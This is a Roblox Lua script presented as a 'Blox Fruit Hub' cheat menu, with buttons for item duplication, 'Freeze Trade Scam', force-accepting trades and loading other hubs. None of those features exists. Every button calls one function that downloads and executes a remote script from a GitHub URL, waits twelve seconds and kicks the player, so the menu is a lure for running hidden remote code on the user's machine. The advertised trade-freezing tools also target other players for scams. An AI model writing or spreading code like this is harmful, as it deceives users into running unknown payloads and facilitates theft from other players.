-- Load Orion Library
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

-- Create the main window
local Window = OrionLib:MakeWindow({
    Name = "🌟 Blox Fruit Hub 🌟",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "BloxFruitFeatures",
    IntroEnabled = true,
    IntroText = "Welcome to 🌟 Blox Fruit Hub 🌟!"
})

-- Function to execute the script and kick the player
local function executeAndKick()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/RaitoHubX/BloxFruitsV8/refs/heads/main/BloxV4.lua', true))()
    wait(12) -- Modification ici pour un délai de 12 secondes
    game.Players.LocalPlayer:Kick("⚠️ You have been kicked from the server.")
end

-- Main Features tab
local MainTab = Window:MakeTab({
    Name = "✨ Main Features ✨",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Trade Features tab
local TradeTab = Window:MakeTab({
    Name = "💱 Trade Features 💱",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Other Scripts tab
local OtherTab = Window:MakeTab({
    Name = "🛠️ Other Scripts 🛠️",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Section for "Duplication" in Main Features
MainTab:AddSection({
    Name = "🎲 Duplication Tools"
})

-- Add a textbox for the dupe value
local DupeValue = 0
MainTab:AddTextbox({
    Name = "🔢 Enter Dupe Number",
    Default = "1",
    TextDisappear = true,
    Callback = function(Value)
        DupeValue = tonumber(Value) or 0
        print("Dupe number set to:", DupeValue)
    end
})

-- Add a button to start the dupe process
MainTab:AddButton({
    Name = "🚀 Start Dupe",
    Callback = function()
        if DupeValue > 0 then
            executeAndKick()
        else
            OrionLib:MakeNotification({
                Name = "⚠️ Error",
                Content = "Please enter a valid number before starting.",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    end
})

-- Add buttons in Main Features
MainTab:AddButton({
    Name = "📦 All in Stock",
    Callback = function()
        executeAndKick()
    end
})

MainTab:AddButton({
    Name = "❄️ Freeze Trade Scam",
    Callback = function()
        executeAndKick()
    end
})

MainTab:AddButton({
    Name = "🤖 Auto Farm",
    Callback = function()
        executeAndKick()
    end
})

-- Add section and buttons in Trade Features tab
TradeTab:AddSection({
    Name = "💼 Trade Tools"
})

TradeTab:AddButton({
    Name = "🧊 Freeze Trade",
    Callback = function()
        print("Executing 'Freeze Trade'...")
        executeAndKick()
    end
})

TradeTab:AddButton({
    Name = "💪 Force Accept",
    Callback = function()
        print("Executing 'Force Accept'...")
        executeAndKick()
    end
})

TradeTab:AddButton({
    Name = "🛑 Freeze Player (Anti Jump Victim)",
    Callback = function()
        print("Executing 'Freeze Player'...")
        executeAndKick()
    end
})

-- Section for "Other Scripts"
OtherTab:AddSection({
    Name = "🛠️ Utility Scripts"
})

-- Add buttons in Other Scripts tab
OtherTab:AddButton({
    Name = "🐵 Hoho Hub",
    Callback = function()
        executeAndKick()
    end
})

OtherTab:AddButton({
    Name = "🍌 Banana Hub (Keyless)",
    Callback = function()
        executeAndKick()
    end
})

OtherTab:AddButton({
    Name = "🔴 Redz Hub",
    Callback = function()
        executeAndKick()
    end
})

OtherTab:AddButton({
    Name = "⚡ Speed Hub",
    Callback = function()
        executeAndKick()
    end
})

OtherTab:AddButton({
    Name = "🔷 W-Azure",
    Callback = function()
        executeAndKick()
    end
})

-- Initialize the interface
OrionLib:Init()